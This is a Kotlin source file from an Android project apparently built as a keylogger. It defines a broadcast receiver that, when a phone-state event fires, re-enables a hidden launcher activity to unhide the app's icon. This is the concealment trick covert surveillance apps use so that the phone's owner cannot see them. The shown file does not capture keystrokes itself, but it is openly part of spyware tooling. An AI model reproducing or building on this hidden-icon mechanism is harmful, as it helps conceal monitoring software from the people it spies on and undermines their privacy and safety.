package com.azamovhudstc.androidkeylogger.receiver

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.widget.Toast
import com.azamovhudstc.androidkeylogger.activity.MainFixActivity

class Receiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
       //checking if action is PHONE_STATE
       if (intent?.action == "android.intent.action.PHONE_STATE") {
            
            Toast.makeText(context, "Un-hiding app icon...", Toast.LENGTH_LONG).show()
           
           // unhiding app icon
           val p: PackageManager = context!!.packageManager
            val componentName = ComponentName(context, MainFixActivity::class.java)
            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

        }

    }
}
